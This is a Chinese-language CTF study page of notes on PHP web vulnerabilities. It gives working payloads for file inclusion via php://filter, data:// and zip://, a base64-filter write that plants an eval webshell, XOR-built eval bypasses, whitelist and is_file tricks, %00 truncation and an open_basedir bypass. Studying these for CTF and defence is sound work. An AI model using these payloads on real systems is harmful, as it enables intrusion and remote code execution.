+漏洞：php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。
+注意要点：无
+题目限制：题目中要求url中存在 unctf.com，可访问任意文件
+绕过方式：题目中要求url中存在 unctf.com，最终payload为 url=unctf.com/../../../../../flag，即使服务器没有unctf.com这个目录。
+
+说明：include文件包含使用时，php伪协议可直接使用；利用filter伪协议base64加密读取文件中内容，从而读取被注释内容；另外，可以利用base64加密文件中内容写入文件，将文件中原有内容屏蔽（注意写入时需要把文件内容正好匹配8字节的整数倍，如此才能在编码时显示正常）
+类目：文件包含(include)
+考点：filter协议
+漏洞函数：include、base64
+漏洞：include文件包含使用时，php伪协议可直接使用
+注意要点：注意写入时需要把文件内容正好匹配8字节的整数倍，如此才能在编码时显示正常
+题目限制：flag在可执行文件注释中，不能直接拿到
+绕过方式：利用filter协议将可执行文件转化为base64编码形式后再输出，payload为b=php://filter/read=convert.base64-encode/resource=flag.php
+让你写操作时，如下
+&lt;?php
+$content = '&lt;?php exit; ?&gt;';
+$content .= $_POST['txt'];
+file_put_contents($_POST['filename'], $content);
+解题
+txt=aJTNDJTNGcGhwJTIwZXZhbCUyOCUyNyUyNF9SRVFVRVNUJTVCJTI3c2hlbGwlMjclNUQlMjklM0JlY2hvJTIwJTIyaW0lMjBvayUyMiUzQiUzRiUzRQ==&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php
+前面的那些是&lt;?php eval('$_REQUEST['shell']);echo &quot;im ok&quot;;?&gt;的base64加密，最开头那个a是为了和&lt;?php exit; ?&gt;形成8字节倍数，详细看教程：./详细教程/谈一谈phpfilter的妙用.md
+
+
+说明：利用filter伪协议base64加密绕过不能包含flag字样的过滤，另外，插入php标签代码&lt;?php ?&gt;
+类目：eval、文件包含
+考点：eval利用
+漏洞函数：eval
+漏洞：可执行php的任意代码
+注意要点：
+1.官方说明：代码不能包含打开/关闭 PHP tags。比如， 'echo &quot;Hi!&quot;;' 不能这样传入： '&lt;?php echo &quot;Hi!&quot;; ?&gt;'。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 'echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;'。
+2.现在的eval函数中好像不能有等于号=，此时就需要用到我们的第一种绕过方式了
+题目限制：$data传输数据中不能包含flag字样，而且没有文件包含，需要自己添加
+绕过方式：
+1.包含另一个post参数传入
+payload为
+?a=include&quot;$_POST[b]&quot;?&gt;
+[POST_data]：b=php://filter/read=convert.base64-encode/resource=flag.php
+2.短标签绕过
+payload为
+?a=?&gt;&lt;?=`base64 flag.php`?&gt;
+
+说明：绕过对于字符串一个字符位置的判断：$_page=mb_substr($page,0,mb_strpos($page . '?', '?');
+类目：文件包含、字符串处理函数理解分析
+考点：字符串处理函数理解分析，截取字符串之后再
+漏洞函数：in_array、mb_substr、mb_strpos
+漏洞：
+$_page=mb_substr($page,0,mb_strpos($page . '?', '?'); //从开头截取到问号?的字符串返回
+if (in_array($_page, $whitelist)){return true;}
+注意要点：
+1.in_array() 是区分大小写匹配的。函数原型为in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool，默认不启动严格模式匹配，判断是否相等不判断类型，即粗略比较。如果array为字典格式，匹配时会将key和data全部进行匹配
+题目限制：如上漏洞
+绕过方式：在问号?后加入自己想要访问的文件，payload为?file=source.php?../../../../../ffffllllaaaagggg
+
+说明：is_file无法识别数组元素，返回NULL，而不是false
+类目：比较、返回值
+考点：php获取变量很灵活，不仅可以获取字符串、类，还能赋值数组，但是大多数函数是无法解析数组参数的
+漏洞函数：$_GET、$_POST、is_file
+漏洞：
+$name=$_GET['name'];
+if(!(is_file($name)===false)){flag}else{no flag}
+注意要点：php函数都能返回NULL，有可能就能绕过比较判断。
+正常分析应该是is_file函数返回为true时才能成功，但是实际上因为is_file没办法识别数组元素返回值为NULL。
+题目限制：无
+绕过方式：获取变量时，可以获取各种类型的变量，包括大多数函数无法解析的数组参数，payload为?name[]=1
+
+说明：eval执行任意代码，但是不能输入字母、数字甚至下划线，以字符串异或方式绕过。
+类目：eval、文件包含
+考点：eval利用
+漏洞函数：eval
+漏洞：可执行php的任意代码
+注意要点：相关的方法还有很多，详细的不多数，放上博客链接：
+1.https://blog.csdn.net/qq_45089570/article/details/104156744
+2.https://blog.csdn.net/cliffordr/article/details/104276898
+3.https://www.freebuf.com/articles/web/33824.html
+4.https://cloud.tencent.com/developer/article/1194018
+5.https://my.oschina.net/u/4306654/blog/3363280
+题目限制：$code过滤掉了字符串和数字，也就是说我们只能采用非常字符爆出flag
+绕过方式：
+PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。还可以利用下划线_这个没被过滤的元素构建变量，执行我们的代码：
+1.构建_GET类型的payload：
+payload：
+?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=assert&amp;__=include%20flag
+{讲解}：
+如果是?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag
+则它们分别代表：
+$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;; //_GET
+${$_}[_](${$_}[__]); //$_GET[_]($_GET[__])
+&amp;_=getFlag //执行函数 eval(&quot;getFlag(null)&quot;)，所以上面的payload的意思即为eval(&quot;assert(include flag)&quot;)
+*assert()函数会执行第一个参数字符串中的php代码，如果发生错误会扔出第二个参数exception并且返回False
+2.构建_POST类型的payload：
+payload：
+&lt;?php
+@$_++; //$_=NULL=0  $_++=1
+$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;); //_POST
+${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
+?&gt;
+*同时，post参数：0=assert&amp;1=include%20flag
+{讲解}：
+&lt;?php
+    var_dump('#'^'|'); //得到字符 _
+    var_dump('.'^'~'); //得到字符 P
+	var_dump('/'^'`'); //得到字符 0
+	var_dump('|'^'/'); //得到字符 S
+	var_dump('{'^'/'); //得到字符 T
+	$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);
+	//变量$__值为字符串'_POST'
+?&gt;
+3.第二种get：
+构造 getFlag 的异或字符串 code=$_=&quot;%40%3e%2b%3b%2c%3c%3a&quot;^&quot;%27%5b%5f%7d%40%5d%5d&quot;;$_(); 
+注入一句话${_GET}[_](${_GET}[__]) 
+如果下划线_被禁用，使用大于等于 %7F 的字符
+网址：https://www.cnblogs.com/kalbertlee/p/12287073.html
+
+说明：扫描目录中所有文件并返回文件名数组的函数。scandir
+类目：php函数收集
+考点：php函数收集
+漏洞函数：scandir
+漏洞：scandir扫描目录中所有文件并返回文件名数组的函数
+注意要点：null
+题目限制：使用php函数
+绕过方式：
+scandir ( string $directory , int $sorting_order = ? , resource $context = ? ) : array
+var_dump(scandir('.'));
+参数1为字符串格式的路径，任意路径；参数2默认的排序顺序是按字母升序排列。如果使用了可选参数 sorting_order（设为 1），则排序顺序是按字母降序排列；参数3context 参数的说明见手册中的 Streams API（https://www.php.net/manual/zh/ref.stream.php） 一章。
+另一种读取目的方法是opendir()，然后readdir()，如下
+if(  ( $dh = opendir($dir) ) !== null  )
+     {
+         while ( ( $file = readdir($dh) ) !== false  )
+         {
+             echo &quot;filename: &quot;.$file .&quot; filetype : &quot;.filetype($dir.$file).&quot;&lt;br/&gt;&quot;;
+         }
+     }
+
+说明：执行系统shell命令的函数。system、exec、passthru
+类目：php函数收集
+考点：php函数收集
+漏洞函数：system、exec、passthru
+漏洞：null
+注意要点：null
+题目限制：null
+绕过方式：
+1.system ( string $command , int &amp;$return_var = ? ) : string
+var_dump(system('ls'));
+参数1是要执行的命令；参数2是如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。返回值成功则返回命令输出的最后一行， 失败则返回 false。
+2.exec ( string $command , array &amp;$output = ? , int &amp;$return_var = ? ) : string
+var_dump(exec('ls'));
+参数1是要执行的命令；参数2是如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置；参数3是如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。返回值是命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数，如果想要获取命令的输出内容， 请确保使用 output 参数。
+3.passthru ( string $command , int &amp;$return_var = ? ) : void
+passthru(&quot;cat myfile.zip&quot;,$err);
+参数1是要执行的命令；参数2是如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。
+
+说明：常见的文件包含函数。include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file
+类目：
+考点：
+漏洞函数：
+漏洞：
+注意要点：
+题目限制：
+绕过方式：
+
+说明：常见的文件包含用的协议。file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://
+类目：
+考点：
+漏洞函数：
+漏洞：
+注意要点：
+题目限制：
+绕过方式：
+
+说明：使用%00截断文件名，使文件写入时按照我们的后缀名存入
+类目：php低版本漏洞
+考点：null
+漏洞函数：null
+漏洞：php读取文件
+注意要点：在php版本&lt;=5.2中进行测试是可以使用%00截断的。
+题目限制：会自动加后缀
+绕过方式：
+http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.php%00
+&lt;?php
+include($_GET['file'].'.txt')
+?&gt;
+#即在最后加个%00
+
+说明：zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。
+类目：
+考点：
+漏洞函数：
+漏洞：
+注意要点：
+题目限制：
+绕过方式：
+1.zip://协议
+使用方法
+zip://archive.zip#dir/file.txt
+zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]
+利用方式
+http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt
+先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。
+由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径（详细请看：./详细教程/php伪协议实现命令执行的七种姿势.md）
+2.bzip2://协议
+使用方法
+compress.bzip2://file.bz2
+利用方式
+http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg
+http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg
+3.zlib://协议
+使用方法
+compress.zlib://file.gz
+利用方式
+http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg
+http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg
+
+说明：data://协议利用
+类目：null
+考点：null
+漏洞函数：null
+漏洞：null
+注意要点：
+data://协议必须双在on才能正常使用；
+allow_url_fopen ：on
+allow_url_include：on
+题目限制：null
+绕过方式：
+利用方式
+http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;
+http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+http://127.0.0.1/cmd.php?file=data:text/plain,&lt;?php phpinfo()?&gt;
+http://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+
+说明：
+类目：php执行代码方法（php -r）；open_basedir='/var/www/html'限制读根目录时可以通过配置php.ini文件来绕过；php+文件，相当于include包含文件。
+考点：php基本知识
+漏洞函数：null
+漏洞：php -c 'php.ini'(php.ini为自定义的空文件)可以绕过配置文件中配置
+注意要点：null
+题目限制：在shell界面，但是大多数linux命令不能使用，但可以用php。
+绕过方式：
+&gt;php.ini
+#用&gt;来写文件，可以写一个空配置的php.ini文件
+php -c 'php.ini' -r &quot;readfile('flag');&quot;
+#这样便可以直接读取文件
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br><span class="line-number">196</span><br><span class="line-number">197</span><br><span class="line-number">198</span><br><span class="line-number">199</span><br><span class="line-number">200</span><br><span class="line-number">201</span><br><span class="line-number">202</span><br><span class="line-number">203</span><br><span class="line-number">204</span><br><span class="line-number">205</span><br><span class="line-number">206</span><br><span class="line-number">207</span><br><span class="line-number">208</span><br><span class="line-number">209</span><br><span class="line-number">210</span><br><span class="line-number">211</span><br><span class="line-number">212</span><br><span class="line-number">213</span><br><span class="line-number">214</span><br><span class="line-number">215</span><br><span class="line-number">216</span><br><span class="line-number">217</span><br><span class="line-number">218</span><br><span class="line-number">219</span><br><span class="line-number">220</span><br><span class="line-number">221</span><br><span class="line-number">222</span><br><span class="line-number">223</span><br><span class="line-number">224</span><br><span class="line-number">225</span><br><span class="line-number">226</span><br><span class="line-number">227</span><br><span class="line-number">228</span><br><span class="line-number">229</span><br><span class="line-number">230</span><br><span class="line-number">231</span><br><span class="line-number">232</span><br><span class="line-number">233</span><br><span class="line-number">234</span><br><span class="line-number">235</span><br><span class="line-number">236</span><br><span class="line-number">237</span><br><span class="line-number">238</span><br><span class="line-number">239</span><br><span class="line-number">240</span><br><span class="line-number">241</span><br><span class="line-number">242</span><br><span class="line-number">243</span><br><span class="line-number">244</span><br><span class="line-number">245</span><br><span class="line-number">246</span><br><span class="line-number">247</span><br></div></div></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
+      <ins class="adsbygoogle"
+          style="display:block"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="6620245489"
+          data-ad-format="auto"
+          data-full-width-responsive="true"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div> <div class="page-edit"><!----> <!----> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/1b65d0/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">php伪协议实现命令执行的七种姿势</div></a> <a href="/pages/791941/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">利用_phar_拓展_php_反序列化漏洞攻击面</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/pages/1b65d0/" class="prev">php伪协议实现命令执行的七种姿势</a></span> <span class="next"><a href="/pages/791941/">利用_phar_拓展_php_反序列化漏洞攻击面</a>→
+      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/7678ce/"><div>常量</div></a> <span>01-19</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/f00cdc/"><div>超全局变量</div></a> <span>01-19</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/0f76f2/"><div>4vim简单配置</div></a> <span>01-19</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:994020638@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/thunder-sword" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://music.163.com/#/playlist?id=755597173" title="听音乐" target="_blank" class="iconfont icon-erji"></a></div> 
+  Theme by
+  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
+    | Copyright © 2019-2021
+    <span>Evan Xu | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <div class="body-bg" style="background:url() center center / cover no-repeat;opacity:0.5;"></div> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">×</i> <div><!-- 固定160*160px -->
+      <ins class="adsbygoogle"
+          style="display:inline-block;max-width:160px;max-height:160px"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="8377369658"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script>
+      </div></div></div></div><div class="global-ui"><div></div></div></div>
+    <script src="/assets/js/app.8ae89511.js" defer></script><script src="/assets/js/2.21067fc1.js" defer></script><script src="/assets/js/82.73bce673.js" defer></script>
+  </body>
+</html>
